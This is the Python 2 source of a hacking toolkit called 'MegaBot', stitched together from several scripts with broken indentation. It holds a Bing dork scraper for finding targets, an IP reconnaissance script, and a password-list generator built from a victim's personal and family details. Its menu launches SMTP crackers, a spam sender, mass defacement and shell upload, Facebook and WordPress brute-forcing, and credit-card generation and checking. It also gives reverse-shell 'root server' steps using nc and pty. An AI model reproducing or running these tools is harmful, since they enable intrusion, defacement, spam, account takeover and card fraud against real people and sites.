         try:
             while True:
                 dork = self.q.get()
                 for domain in self.domains:
                     next = 0
                     while next <= 500:
                         url = 'http://www.bing.com/search?q=' + dork + ' site:' + domain + '&first=' + str(
                             next) + '&FORM=PORE'
                         sess = requests.session()
                         cnn = sess.get(url, timeout=5)
                         next = next + 10
                         finder = re.findall(
                             '<h2><a href="((?:https://|http://)[a-zA-Z0-9-_]+\.*[a-zA-Z0-9][a-zA-Z0-9-_]+\.[a-zA-Z]{2,11})',
                             cnn.text)
                         for url in finder:
                             if url.startswith('http://'):
                                 url = url.replace('http://', '')
                             elif url.startswith('https://'):
                                 url = url.replace('https://', '')
                             else:
                                 pass
                             if url.startswith('www.'):
                                 url = url.replace('www.', '')
                             else:
                                 pass
                             with open("logs/logs.txt", 'a') as f:
                                 if 'go.microsoft.com' in url:
                                     pass
                                 elif '.wordpress.' in url:
                                     pass
                                 elif '.blogspot.' in url:
                                     pass
                                 else:
                                     connection = sqlite3.connect("Database.sqlite3")
                                     cursor = connection.cursor()
                                     try:
                                         self.cur_execute("INSERT INTO dorker_db('url') VALUES(?)", ('www.' + url,))
                                         print self.c + '       [' + self.y + '+' + self.c + '] ' + self.y + url +\
                                               self.g + ' --> ADDED TO Database'
                                     except sqlite3.IntegrityError:
                                         print self.c + '       [' + self.y + '+' + self.c + '] ' + self.y + url + \
                                               self.r + ' --> Was in Database'
                                     cursor.close()
                                     connection.close()
                 self.q.task_done()
         except:
             pass
 class RowDataBAse(object):
     def __init__(self):
         self.r = '\033[31m'
         self.g = '\033[32m'
         self.y = '\033[33m'
         self.b = '\033[34m'
         self.m = '\033[35m'
         self.c = '\033[36m'
         self.w = '\033[37m'
         self.rr = '\033[39m'
         connection = sqlite3.connect("Database.sqlite3")
         cursor = connection.cursor()
         cursor.execute("SELECT id, url FROM dorker_db;")
         results = cursor.fetchall()
         for r in results:
             with open('results/urls.txt', 'a') as xxx:
                 xxx.write(r[1] + '\n')
         print self.c + '       [' + self.y + '+' + self.c + '] ' + self.y + 'Saved In' + self.g + ' results/urls.txt'
         cursor.close()
         connection.close()
 class ClearDatabase(object):
     def __init__(self):
         self.r = '\033[31m'
         self.g = '\033[32m'
         self.y = '\033[33m'
         self.b = '\033[34m'
         self.m = '\033[35m'
         self.c = '\033[36m'
         self.w = '\033[37m'
         self.rr = '\033[39m'
         connection = sqlite3.connect("Database.sqlite3")
         cursor = connection.cursor()
         try:
             cursor.execute("delete from dorker_db;")
             print self.c + '       [' + self.y + '+' + self.c + '] ' + self.y + 'Successfully Cleared DataBase!'
             connection.commit()
         except:
             print self.c + '       [' + self.y + '+' + self.c + '] ' + self.y + 'cant delete Rows!'
             sys.exit()
         cursor.close()
         connection.close()
 class Main():
     def __init__(self):
         self.gg = True
         self.r = '\033[31m'
         self.g = '\033[32m'
         self.y = '\033[33m'
         self.b = '\033[34m'
         self.m = '\033[35m'
         self.c = '\033[36m'
         self.w = '\033[37m'
         self.rr = '\033[39m'
         self.cls()
         self.print_logo()
         self.PrintOptions()
         while self.gg == True:
             Chose = raw_input(str('    @> '))
             if Chose == str(1):
                 self.cls()
                 self.print_logo()
                 Dorker()
             elif Chose == str(2):
                 self.cls()
                 self.print_logo()
                 RowDataBAse()
             elif Chose == str(3):
                 self.cls()
                 self.print_logo()
                 ClearDatabase()
             elif Chose == str(99) or Chose == "Exit" or Chose == "exit":
                 self.gg = False
                 sys.exit()
             elif Chose == "help" or Chose == "Help" or Chose == "HELP":
                 self.PrintOptions()
             elif Chose == "cls" or Chose == "clear":
                 self.cls()
                 self.print_logo()
                 self.PrintOptions()
             else:
                 print self.c + '[' + self.r + '-' + self.c + '] ' + self.w + str(Chose) + ' Commend Not Found!'
                 continue
     def cls(self):
         linux = 'clear'
         windows = 'cls'
         os.system([linux, windows][os.name == 'nt'])
     def print_logo(self):
         clear = "\x1b[0m"
         colors = [36, 32, 34, 35, 31, 37]
         x = """
                     White Hat Hackers
                    _     _            _             
                   | |   | |          | | priv8 Dorker By Jok3r
                   | | __| | ___  _ __| | _____ _ __ 
               _   | |/ _` |/ _ \| '__| |/ / _ \ '__|
              | |__| | (_| | (_) | |  |   <  __/ |   
               \____/ \__,_|\___/|_|  |_|\_\___|_|   
                         Iran-cyber.Net    
                    FR0M : MegaBot T00L
      Note! : We don't Accept any responsibility for any illegal usage.       
     """
         for N, line in enumerate(x.split("\n")):
             sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
             time.sleep(0.05)
     def PrintOptions(self):
         print(self.y + '        [1] ' + self.c + ' Dork Scanner')
         print(self.y + '        [2] ' + self.c + ' Get Domains From DataBase')
         print(self.y + '        [3] ' + self.c + ' Clear DAtabase')
         print(self.y + '        [99]' + self.c + ' Exit')
 Main()
def logo():
        clear = "\x1b[0m"
        colors = [36, 32, 34, 35, 31, 37]

        x = """ __   __  _______  _______  _______    _______  _______  _______ 
|  |_|  ||       ||       ||   _   |  |  _    ||       ||       |
|       ||    ___||    ___||  |_|  |  | |_|   ||   _   ||_     _|
|       ||   |___ |   | __ |       |  |       ||  | |  |  |   |  
|       ||    ___||   ||  ||       |  |  _   | |  |_|  |  |   |  
| ||_|| ||   |___ |   |_| ||   _   |  | |_|   ||       |  |   |  
|_|   |_||_______||_______||__| |__|  |_______||_______|  |___|  
         MegaBot - V1 | PriV8 Bot | ARON-TN & YassineHd             
                          Fixed Version                                        
               [=] CodED By ARON-TN & YassineHd [=]
			   
			                   It's X4PriV8 V2 """
        for N, line in enumerate(x.split("\n")):
            sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
            time.sleep(0.05)
def zabour():
 print ('''
{g} (o)__(o)wWw  wWw(o)__(o)  .-.     
 (__  __)(O)  (O)(__  __)c(O_O)c   
   (  )  / )  ( \  (  ) ,'.---.`,  
    )(  / /    \ \  )( / /|_|_|\ \ 
   (  ) | \____/ | (  )| \_____/ | 
    )/  '. `--' .`  )/ '. `---' .` 
   (      `-..-'   (     `-...-'   
  {c} Welcome Guys
   Show This tuto :
     https://bit.ly/2A3JQ1p
 ''').format(r=la7mar,b=lazra9,g=la5dhar,c=cyan)
def zeb():
 print (""" 
                       {re}~{r}> {r}<{y}TNT{r}>{g} MegaBot {r}</{y}TNT{r}> <{re}~{r}
{re}~{r}> About {re}: {y}
     Coders    {re}: {b}ARON-TN & YassineHd {y}
     E-mail    {re}: {r}[{b} aron.tn.official@gmail.com {r}] {y}
     Youtube   {re}: {r}[{b}https://www.youtube.com/arontn-official Or ARON-TN {r}]{y}
     Site      {re}: {r}[{b}https://www.market0day.tk{r}]{y}
     Github    {re}: {r}[{b}https://www.github.com/ARON-TN{r}]{c}
{g}Also you need to remove "http://" or "https://" from any websites list
{re} ~{r}> {r}({c}C{r}){c}opyright 2018 - ARON-tn & YassineHd \033[00m""") .format(r=la7mar,b=lazra9,g=la5dhar,y=lasfar,re=ramadi,m=movv,c=cyan)
 raw_input("Press Enter To exit .. ")
def samara():
 print('''
 For security Reasons XDDD
 you Can Make update Auto
 Contact us :
 ''')
def ko():
 print ("""
.####.########..########.
..##..##.....##.##.....##
..##..##.....##.##.....##
..##..########..########.
..##..##........##...##..
..##..##........##....##.
.####.##........##.....## By ARON-tn & YassineHd
             From : MegaBot""")
 def color(text, color_code):
     if sys.platform == "win32" and os.getenv("TERM") != "xterm":
         return text
     return '\x1b[%dm%s\x1b[0m' % (color_code, text)
 def red(text):
     return color(text, 31)
 def blue(text):
     return color(text, 34)
 if __name__ == "__main__":
     my_ip = urlopen('http://ip.42.pl/raw').read()
     print(blue('Get Reverse DNS, GeoIP, NMAP, Traceroute and pulls HTTP Headers for an IP address'))
     print(blue('A quick and dirty script by ARON-tn & YassineHd'))
     print('\n')
     print(red('Your public IP address is {0}'.format(my_ip)))
     print('\n')
     #Get IP To SCAN
     resp = raw_input(blue('Would you like target info about {0}? (Y/N):'.format(my_ip)))
     if resp.lower() in ["yes", "y"]:
         badip = my_ip
     else:
         badip = raw_input(blue("What IP would you like to check?: "))
     print('\n')
     #IP INFO
     reversed_dns = urllib.urlopen('http://api.hackertarget.com/reverseiplookup/?q=' + badip).read()
     geoip = urllib.urlopen('http://api.hackertarget.com/geoip/?q=' + badip).read()
     nmap = urllib.urlopen('http://api.hackertarget.com/nmap/?q=' + badip).read()
     httpheaders = urllib.urlopen('http://api.hackertarget.com/httpheaders/?q=' + badip).read()
     tracert = urllib.urlopen('http://api.hackertarget.com/mtr/?q=' + badip).read()
     print(red('Reverse DNS Information:'))
     print(blue(reversed_dns))
     print('\n')
     print(red('GEOIP Information:'))
     print(blue(geoip))
     print('\n')
     print(red('NMAP of Traget (Only Ports: 21,25,80 and 443):'))
     print(blue(nmap))
     print('\n')
     print(red('HTTP Headers:'))
     print(blue(httpheaders))
     print('\n')
     print(red('Trace Route:'))
     print(blue(tracert))
     print('\n')
def zibyy():
 print (""" 
                     {re}~{r}> {g}contact D3v3L0PP3Rs <{re}~{r}
{re}~{r}> About ARON-TN{re}:
      {g}E-mail    {re}: {r}[{b}aron.tn.official@gmail.com {r}] {y}
      {g}Youtube   {re}: {r}[{b}https://www.youtube.com/arontn-official or ARON-TN{r}]{y}
      {g}Site      {re}: {r}[{b}https://www.market0day.tk{r}]{y}
      {g}Github    {re}: {r}[{b}https://www.github.com/ARON-TN {r}]{c}
{re}~{r}> About YassineHd{re}:
      {g}Facebook  {re}: {y}https://www.facebook.com/yassinehd.official
      {g}E-mail    {re}: {r}[{b}yassinexhd@gmail.com {r}] {y}
      {g}Youtube   {re}: {r}[{b}https://www.youtube.com/channel/UCpPSnHx6CSjYdPMfuHRJe5w or Yassine Hd{r}]{y}
{re} ~{r}> {r}({c}C{r}){c}opyright 2018 - ARON-tn & YassineHd \033[00m

{re}~{r}> THNX FOR USING MY BOT
""") .format(r=la7mar,b=lazra9,g=la5dhar,y=lasfar,re=ramadi,m=movv,c=cyan)
 raw_input("\n\033[95mPress Enter To exit ..\033[0m ")
class zalzoumiya ():
 def __init__(self):
  BLUE = '\033[94m'
  RED = '\033[91m'
  GREEN = '\033[32m'
  WHITE  = '\033[0m'
  ORANGE  = '\033[33m'
  BUS = '\033[34m'




# ----------------------------
# framework banner
# ---------------------------

  print ""
  print RED+"                  ,__,             "
  print RED+"                  (oo)____         "
  print RED+"                  (__)    )\ "
  print RED+"                     ||--|| *      "
  print BLUE+"         'Common User Password Profiler'"
  print BLUE+"        [Author] Muris Kurgas aka j0rgan"
  print ""
  print ""
  print BUS+"[*] [input target info]:"+WHITE+" to make a dictionary [low cases!]"
  print ORANGE+"[*] If you don't know all the info, just hit enter when asked!\r\n"






# --------------------------------
# start script functions
# --------------------------------
  print WHITE+""
  name = raw_input("> Name: ")
  if len(name) == 0 or name == " " or name == "  " or name == "   ":
	print RED+"\r\n[x] You must enter a name at least!"
	print RED+"[X] Now exiting...\r\n"
        print WHITE+""
	sys.exit()

  surname = raw_input("> Surname: ")
  nick = raw_input("> Nickname: ")
  birthdate = raw_input("> Birthdate (DDMMYYYY; i.e. 04111985): ")
  if len(birthdate) != 0:
	if len(birthdate) != 8:
		print RED+"\r\n[x] You must enter 8 digits for birthday!"
		print RED+"[x] Now exiting...\r\n"
                print WHITE+""
		sys.exit()


  print ""
  wife = raw_input("> Wife's(husband's) name: ")
  wifen = raw_input("> Wife's(husband's) nickname: ")
  wifeb = raw_input("> Wife's(husband's) birthdate (DDMMYYYY; i.e. 04111985): ")
  if len(wifeb) != 0:
	if len(wifeb) != 8:
		print RED+"\r\n[x] You must enter 8 digits for birthday!"
		print RED+"[x] Now exiting...\r\n"
                print WHITE+""
		sys.exit()


  print ""
  kid = raw_input("> Child's name: ")
  kidn = raw_input("> Child's nickname: ")
  kidb = raw_input("> Child's birthdate (DDMMYYYY; i.e. 04111985): ")
  if len(kidb) != 0:
	if len(kidb) != 8:
		print RED+"\r\n[x] You must enter 8 digits for birthday!"
		print RED+"[X] Now exiting...\r\n"
                print WHITE+""
		sys.exit()


  print ""
  pet = raw_input("> Pet's name: ")
  company = raw_input("> Company name: ")

  print ""
  words = ['']
  oth = raw_input("> Do you want to add some key words about the victim? [Y/N]: ")
  if oth == "y" or oth == "Y":
	words = raw_input("> Please enter the words, separated by comma. [i.e. hacker, juice, black]: ").split(", ")




  print BUS+"\r\n[*] [please wait]:"+WHITE+" making a dictionary..."


# ----------------------------------------
# Now me must do some string modifications
# ----------------------------------------
  birthdate_yy = birthdate[-2:]
  birthdate_yyy = birthdate[-3:]
  birthdate_yyyy = birthdate[-4:]
  birthdate_xd = birthdate[1:2]
  birthdate_xm = birthdate[3:4]
  birthdate_dd = birthdate[:2]
  birthdate_mm = birthdate[2:4]

  wifeb_yy = wifeb[-2:]
  wifeb_yyy = wifeb[-3:]
  wifeb_yyyy = wifeb[-4:]
  wifeb_xd = wifeb[1:2]
  wifeb_xm = wifeb[3:4]
  wifeb_dd = wifeb[:2]
  wifeb_mm = wifeb[2:4]

  kidb_yy = kidb[-2:]
  kidb_yyy = kidb[-3:]
  kidb_yyyy = kidb[-4:]
  kidb_xd = kidb[1:2]
  kidb_xm = kidb[3:4]
  kidb_dd = kidb[:2]
  kidb_mm = kidb[2:4]

# ----------------------------------
# Convert first letters to uppercase
# ----------------------------------
  nameup = name.title()
  surnameup = surname.title()
  nickup = nick.title()
  wifeup = wife.title()
  wifenup = wifen.title()
  kidup = kid.title()
  kidnup = kidn.title()
  petup = pet.title()
  companyup = company.title()
  wordsup = []
  for words1 in words:
	wordsup.append(words1.title())

  word = words+wordsup

# ------------------------------
# reverse a name
# -----------------------------
  rev_name = name[::-1]
  rev_nameup = nameup[::-1]
  rev_nick = nick[::-1]
  rev_nickup = nickup[::-1]
  rev_wife = wife[::-1]
  rev_wifeup = wifeup[::-1]
  rev_kid = kid[::-1]
  rev_kidup = kidup[::-1]

  reverse = [rev_name, rev_nameup, rev_nick, rev_nickup, rev_wife, rev_wifeup, rev_kid, rev_kidup]
  rev_n = [rev_name, rev_nameup, rev_nick, rev_nickup]
  rev_w = [rev_wife, rev_wifeup]
  rev_k = [rev_kid, rev_kidup]

# --------------------------------
# Let's do some serious work! This will be a mess of code, but... who cares? :)
# --------------------------------
  bds = [birthdate_yy, birthdate_yyy, birthdate_yyyy, birthdate_xd, birthdate_xm, birthdate_dd, birthdate_mm]

  bdss = []

  for bds1 in bds:
	bdss.append(bds1)
	for bds2 in bds:
		if bds.index(bds1) != bds.index(bds2):
			bdss.append(bds1+bds2)
			for bds3 in bds:
				if bds.index(bds1) != bds.index(bds2) and bds.index(bds2) != bds.index(bds3) and bds.index(bds1) != bds.index(bds3):
					bdss.append(bds1+bds2+bds3)



# ---------------------------------
# For a woman
# ---------------------------------
  wbds = [wifeb_yy, wifeb_yyy, wifeb_yyyy, wifeb_xd, wifeb_xm, wifeb_dd, wifeb_mm]

  wbdss = []

  for wbds1 in wbds:
	wbdss.append(wbds1)
	for wbds2 in wbds:
		if wbds.index(wbds1) != wbds.index(wbds2):
			wbdss.append(wbds1+wbds2)
			for wbds3 in wbds:
				if wbds.index(wbds1) != wbds.index(wbds2) and wbds.index(wbds2) != wbds.index(wbds3) and wbds.index(wbds1) != wbds.index(wbds3):
					wbdss.append(wbds1+wbds2+wbds3)



# ---------------------------------
# and a child
# ---------------------------------
  kbds = [kidb_yy, kidb_yyy, kidb_yyyy, kidb_xd, kidb_xm, kidb_dd, kidb_mm]

  kbdss = []

  for kbds1 in kbds:
	kbdss.append(kbds1)
	for kbds2 in kbds:
		if kbds.index(kbds1) != kbds.index(kbds2):
			kbdss.append(kbds1+kbds2)
			for kbds3 in kbds:
				if kbds.index(kbds1) != kbds.index(kbds2) and kbds.index(kbds2) != kbds.index(kbds3) and kbds.index(kbds1) != kbds.index(kbds3):
					kbdss.append(kbds1+kbds2+kbds3)


# ---------------------------------
# string combinations
# ---------------------------------
  kombinaac = [pet, petup, company, companyup]

  kombina = [name, surname, nick, nameup, surnameup, nickup]

  kombinaw = [wife, wifen, wifeup, wifenup, surname, surnameup]

  kombinak = [kid, kidn, kidup, kidnup, surname, surnameup]

  kombinaa = []
  for kombina1 in kombina:
	kombinaa.append(kombina1)
	for kombina2 in kombina:
		if kombina.index(kombina1) != kombina.index(kombina2) and kombina.index(kombina1.title()) != kombina.index(kombina2.title()):
			kombinaa.append(kombina1+kombina2)

  kombinaaw = []
  for kombina1 in kombinaw:
	kombinaaw.append(kombina1)
	for kombina2 in kombinaw:
		if kombinaw.index(kombina1) != kombinaw.index(kombina2) and kombinaw.index(kombina1.title()) != kombinaw.index(kombina2.title()):
			kombinaaw.append(kombina1+kombina2)

  kombinaak = []
  for kombina1 in kombinak:
	kombinaak.append(kombina1)
	for kombina2 in kombinak:
		if kombinak.index(kombina1) != kombinak.index(kombina2) and kombinak.index(kombina1.title()) != kombinak.index(kombina2.title()):
			kombinaak.append(kombina1+kombina2)



# inserting some years, you can add more if you want...
  years = ['2000', '2001', '2002', '2003', '2004', '2005', '2006', '2007', '2008', '2009', '2010']
# and some random numbers to make a pwnsauce.., :)
  def concats(seq, start, stop):
    for mystr in seq:
        for num in xrange(start, stop):
            yield mystr + str(num)




# -----------------------------------
# now sorting and making combinations
# -----------------------------------
  def komb(seq, start):
    for mystr in seq:
        for mystr1 in start:
            yield mystr + mystr1

  komb1 = list(komb(kombinaa, bdss))
  komb2 = list(komb(kombinaaw, wbdss))
  komb3 = list(komb(kombinaak, kbdss))
  komb4 = list(komb(kombinaa, years))
  komb5 = list(komb(kombinaac, years))
  komb6 = list(komb(kombinaaw, years))
  komb7 = list(komb(kombinaak, years))
  komb8 = list(komb(word, bdss))
  komb9 = list(komb(word, wbdss))
  komb10 = list(komb(word, kbdss))
  komb11 = list(komb(word, years))
# adding random numbers from 0 to 1000, you can change this...
  komb12 = list(concats(word, 0, 1000))
  komb13 = list(concats(kombinaa, 0, 1000))
  komb14 = list(concats(kombinaac, 0, 1000))
  komb15 = list(concats(kombinaaw, 0, 1000))
  komb16 = list(concats(kombinaak, 0, 1000))
  komb17 = list(komb(reverse, years))
  komb18 = list(komb(rev_w, years))
  komb19 = list(komb(rev_k, kbdss))
  komb20 = list(komb(rev_n, bdss))
  komb21 = list(concats(reverse, 0, 1000))

  print BUS+"[*]"+WHITE+" Sorting list and removing duplicates..."

  komb_unique1 = dict.fromkeys(komb1).keys()
  komb_unique2 = dict.fromkeys(komb2).keys()
  komb_unique3 = dict.fromkeys(komb3).keys()
  komb_unique4 = dict.fromkeys(komb4).keys()
  komb_unique5 = dict.fromkeys(komb5).keys()
  komb_unique6 = dict.fromkeys(komb6).keys()
  komb_unique7 = dict.fromkeys(komb7).keys()
  komb_unique8 = dict.fromkeys(komb8).keys()
  komb_unique9 = dict.fromkeys(komb9).keys()
  komb_unique10 = dict.fromkeys(komb10).keys()
  komb_unique11 = dict.fromkeys(komb11).keys()
  komb_unique12 = dict.fromkeys(komb12).keys()
  komb_unique13 = dict.fromkeys(komb13).keys()
  komb_unique14 = dict.fromkeys(komb14).keys()
  komb_unique15 = dict.fromkeys(komb15).keys()
  komb_unique16 = dict.fromkeys(komb16).keys()
  komb_unique17 = dict.fromkeys(komb17).keys()
  komb_unique18 = dict.fromkeys(komb18).keys()
  komb_unique19 = dict.fromkeys(komb19).keys()
  komb_unique20 = dict.fromkeys(komb20).keys()
  komb_unique21 = dict.fromkeys(komb21).keys()
  komb_unique01 = dict.fromkeys(kombinaa).keys()
  komb_unique02 = dict.fromkeys(kombinaac).keys()
  komb_unique03 = dict.fromkeys(kombinaaw).keys()
  komb_unique04 = dict.fromkeys(kombinaak).keys()
  komb_unique05 = dict.fromkeys(word).keys()

  uniqlist = bdss+wbdss+kbdss+reverse+komb_unique01+komb_unique02+komb_unique03+komb_unique04+komb_unique05+komb_unique1+komb_unique2+komb_unique3+komb_unique4+komb_unique5+komb_unique6+komb_unique7+komb_unique8+komb_unique9+komb_unique10+komb_unique11+komb_unique12+komb_unique13+komb_unique14+komb_unique15+komb_unique16+komb_unique17+komb_unique18+komb_unique19+komb_unique20+komb_unique21

  unique_list = dict.fromkeys(uniqlist).keys()


  f = open ( name+'.txt', 'w' )
  f.write (os.linesep.join(unique_list))
  f.close()

  lines = 0
  fcount = open ( name+'.txt', 'r' )
  for line in fcount:
	lines += 1

  fcount.close()

  print BUS+"[*]"+WHITE+" Saving dictionary to "+GREEN+"["+name+".txt]"+WHITE+", counting "+GREEN+"["+str(lines)+"]"+WHITE+" words."
  print BUS+"[*]"+WHITE+" Now load your pistolero with "+GREEN+"["+name+".txt]"+WHITE+" and shoot! Good luck!"
  print WHITE+""
  print WHITE+""
def main():
 logo()
 print Fore.CYAN
 print(""" +----------------------------------+----------------------------------+
 1) Get X4PriV8 V1                  | 22) XAttacker 2.5 (official)
 2) AUto Fixer(For Linux & Termux)  | 23) Bazooka Bot V1.2 (official)
 3) Mass zone-h Cleaners            | 24) izocin bot (official)
 4) X4R0N SENDER (GX40 Sender)      | 25) RXR Bot v2
 5) Smtp Cracker With Ip            | 26) BOT v3.7 Wolf Xbrang
 6) Smtp Cracker combo              | 27) CMS Remote SQL Injection
 7) Smtp Tester Work Or No          | 28) ZOmbi/DrHEx Bot v5.7
 8) zone-h AUTO ( DEFACE & POST )   | 29) Ccgen & Cc check
 9) How To Root Server              | 30) ProxyBroker
 10) J-Dorker                       | 31) MrSpy Bot V5
 11) EMAILS FILTER                  | 32) PayLoad Bot V3(AutoExploiter)
 12) CMS Filters                    | 33) Hasher(OnLY LINUX/TERMUX USERs)
 13) IP reverse                     | 34) PayPal MAil VAlid Checker
 14) Cut Url Using This script      | 35) Apple Email VAlid Checker
 15) PassWords list Maker           | 36) Facebook BruteForce
 16) WebApp Information Gatherer    | 37) Wordpress BruteForce
 17) social vuln scanner            | 38) Key Generator(steam-hma)
 18) 0day Priv8 Bot 2018            | 39) Osif Bot 
 19) Th3inspector Bot               | 40) Xsmash Tool
 20) Auto Fucker Bot V1             | 41) expl joomla Com_s5clanroster 
 21) BadMob Bot V2                  | 42) FBI Tool  
 +----------------------------------+----------------------------------+
             98) contact D3v3L0PP3R  99) Check F0R Update 
{r}/{g}!{r}\ {r}Please  If you got Problem or any new idea contact me .{y}
 """).format(r=la7mar,b=lazra9,g=la5dhar,y=lasfar,re=ramadi,m=movv,c=cyan)
 zz=raw_input('Mega > ')
 if zz=='1':
   os.system('git clone https://github.com/Aron-tn/X4PriV8_V1/')
   print("""\n\033[91mDone. Do You Need To open It ? 
  y/n
  y = yes 
  n = no\033[0m""")
   t=raw_input('~>')
   if t=='y':
    if system() == 'Linux':
     os.system("cd X4Priv8_V1 && chmod +x X4PriV8.py && python2 X4PriV8.py")
    if system() == 'Windows':
     os.system('cd X4Priv8_V1 && chmod +x X4PriV8.py && X4PriV8.py')
    else:
     print('unknown error :| ')
   elif t=='n':
    main()
   else :
    print('unknown error :| ')
 elif zz=='2':
  print '''
   _        _____          ___ _               
  /_\  _   /__   \___     / __(_)_  _____ _ __ 
 //_\\| | | |/ /\/ _ \   / _\ | \ \/ / _ \ '__|
/  _  \ |_| / / | (_) | / /   | |>  <  __/ |   
\_/ \_/\__,_\/   \___/  \/    |_/_/\_\___|_|   
                           ~>By Aron_TN 
		  ~> (C)copyright 2018 - MegaBot
												
(1) Install Python-Pip												
(2) Install Important Packages To Ur Linux Or Termux												
(3) Install Modules(Python & Perl)
'''

  poop =['requests','setuptools','pymssql','crypto','openssl','mechanize','stem','pysocks','fuzzywuzzy','validate_email','wheel','python-Levenshtein','SleekXMPP','xmppy','beautifulsoup4','','','prettytable','colorama','lxml','bs4','dnspython','httplib2']
  home=['Parallel/ForkManager.pm','WWW::Mechanize;','DBI','HTTP::Response','HTTP::Request','Net::SSLeay','YAML','MIME::Base64','LWP::UserAgent','Getopt::Std','Moose','threads','threads::shared'] 
  tit3 =raw_input("MegaBot > ")
  if tit3 =='1':
    print "Python 2x # \033[00m"
    if system() == 'Linux':
     os.system("sudo apt-get install python-pip")
    else:
     os.system("pkg install python-pip")
    print "Python 3x "
    if system() == 'Linux':
     os.system("sudo apt-get install python-pip3")
    else:
     os.system("pkg install python-pip3")
  elif tit3 =='2':
    if system() == 'Linux':
     os.system('sudo apt-get install python2 python3 git ruby perl php nano vim')
    else:
     os.system('pkg install python2 python3 git ruby perl php nano vim wget sudo')
  elif tit3 =='3':
    os.system('clear')
    print """
	[1] > Perl
	[2] > Python
	"""
    conan =raw_input("MegaBot > ")
    if conan =='1':
     if system() == 'Linux':
      os.system('sudo apt-get install build-essential')
     else:
      os.system('pkg install build-essential')
     for me in home:
      print "\033[91m[+] Install "+me
      os.system("sudo cpan "+me)
    elif conan =='2':
     for keke in poop:
      print "\033[91m[+] Install "+keke+' ...'
      os.system("pip install "+keke)
  elif tit3 =='4':
   main()
  else :
   print ('open ur fucking eyes')
 elif zz=='3':
  print '''{g}       ---------------------------------------
      /  ____                 _  _           /0
     /  |_  /___ _ _  ___ ___| || |         / 0
    /    / // _ \ ' \/ -_)___| __ |        /  0
   /    /___\___/_||_\___|   |_||_|       /   0
  /      / __| |___ __ _ _ _  ___ _ _    /    0
 /      | (__| / -_) _` | ' \/ -_) '_|  /     0
|        \___|_\___\__,_|_||_\___|_|   |      0
|                                      |      0
|         {y}C0D3D BY YASSINE HD{g}          |      0
|{r}FACEBOOK : {m} fb.com/yassinehd.official{g} |      0
|               __________             | _____0
|______________|MegaBot|____________|/                                              

      '''.format(r=la7mar,g=la5dhar,y=lasfar,m=movv)


  urls = raw_input('Text File To Clean ? : ')
  with open(urls, 'r') as urls:
   print('''DONE  Bro :')
   SAVED IN {r} zone-h.txt''').format(r=la7mar)
   for line in urls:
     url = line.rstrip() and line.split('\t')
     bond = url[7].replace('...', '')
     benz = url[7].split('/')
     clean = benz[0]
     if 'http://' not in clean:
       url = 'http://'+clean
       with open('zone-h.txt', 'a') as myfile:
        myfile.write('http://'+clean)
        myfile.write('\n')
 elif zz=='4':
  print('''
  W3LC0M3 SP4MM3RS BEFORE USING THIS
  TOOLS U NEED SMTP :v SO IF U HAVE SMTP
  U CAN USE THIS T00LS IF U DON'T HAVE U CAN 
  CRACK SMTP USING THIS TOOL (MegaBot)
  +++++++++++++++++++++++++++++++++++++++++++++
  PUT UR SMTP IN > setting\Gx.settings.php
  PUT UR MAILIST IN > file\maillist.txt
  PUT UR LETTER IN > file\letter
  +++++++++++++++++++++++++++++++++++++++++++++
  U NEED PHP MODULE TO RUN THIS TOOL
  [1] I HAVE MODULE RUN TOOL
  [2] INSTALL MODULE
  [3] Return To Menu
  ''')
  maya=raw_input('MegaBot > ')
  if maya=='1':
   os.system('php ron.php')
  elif maya=='2':
   if system() == 'Windows':
    print("""U are Used Windows Mega Bot Can't install PHP moDule In Windows """)
    raw_input("\n\033[95mPress Enter To exit ..\033[0m ")  
   elif system()== 'Linux':
    os.system('sudo apt-get install php')
    print('''Run tool    
	[1] Yes
    [2] No''')
    kahba=raw_input('Mega > ')
    if kahba=='1':
	 os.system('php ron.php')
    elif kahba=='2':
	 main()
    else :
	 print('unknown error :| ')
  elif maya=='3':
   main()
  else :
   print('unknown error :| ')
 elif zz=='5':
  print ("""  Put UR LIST IPs list IN FILE ips.txt Before Run Tool
  [1] Run Tool
  [2] EXIT
  """)
  fosta=raw_input('MegaBot > ')
  if fosta=='1':
   if system() == 'Linux':
    os.system('python2 vu.py 20 bad')
   elif system() == 'Windows':
    os.system('python vu.py 20 bad')
   else :
    print('unknown error :| ')
 elif zz=='6':
  if system() == 'Windows':
   os.system('config.py')
  if system() == 'Linux':
   os.system('python config.py') 
 elif zz=='7':
  tee1()
 elif zz=='8':
  print('''
  [+] Your List In amiro.txt
  [+] Open File ok.pl In Last part Change 
  Defacer name Aron-tn To your defacer name
 1] Run
 2] Return To Menu
  ''')
  sanfara=raw_input('Mega > ')
  if sanfara=='1':
   print('''What Do U NEED TO UPLOAD ?
	[1] FILE.txt (HACKED BY)
	[2] FILe.JPG (SHELL OR PHOTO)
	[3] Return To Menu.''')
   mr=raw_input('Mega > ')
   if mr=='1':
    os.system('ok.pl amiro.txt othman.txt')
   elif mr=='2':
    os.system('ok.pl amiro.txt othman.jpg')
   elif mr=='3':
    main()
   else :
    print('unknown error :| ')
  elif sanfara=='2':
   main()
  else:
   print('unknown error :| ')
 elif zz=='9':
  print('''
  1) Download NETCUT FROM THIS LINK : http://bit.ly/2L3BGdH
  2) UNZIP FOLDER
  3) DOWNLOAD BOT ZOMBI V5 FROM THIS LINK : http://bit.ly/2PwEQre
  4) NOW GO TO  UR SHELL AND SELECT -=[Network]=- OPTION AND PUT
  ANY PORT ME I SELECT PORT 21 IN [Back-connect to] OPTION 
  5) NOW OPEN TERMINAL (CMD) AND PUT THIS COMMAND {nc -lport 21}
  AND CLICK SUBMIT THE TERMININAL WILL BE SHOW U direction SHELL
  EX: amir/upload/2018/12
  6) NOW UPLOAD FILE "HELLO.sh"
  7) NOW PAST THIS COMMAND IN TERMINAL :
  [python -c "import pty; pty.spawn('/bin/bash')"]
  8) DONE . NOW TO RUN BOT RUN [BASH HELLO.sh] 
  AND ENJOY :v I WILL PUBLISH A VIDEO HOW TO USE IT .
               THANKS FOR ALL <3
  ''')
  raw_input("\n\033[95mPress Enter To exit ..\033[0m ")
 elif zz=='10':
  t3()
 elif zz=='11':
  tommy()
 elif zz=='12':
  os.system('perl fuckers.pl')
 elif zz=='13':
  ko()
 elif zz=='14':
  print('''
  U NEED PHP MODULE TO RUN THIS TOOL
  [1] RUN TOOL
  [2] INSTALL MODULE
  [3] Return To Menu
  ''')
  maya=raw_input('Mega > ')
  if maya=='1':
   xn=raw_input('ur site ??')
   os.system('php kv.php '+xn)
  elif maya=='2':
   if system() == 'Windows':
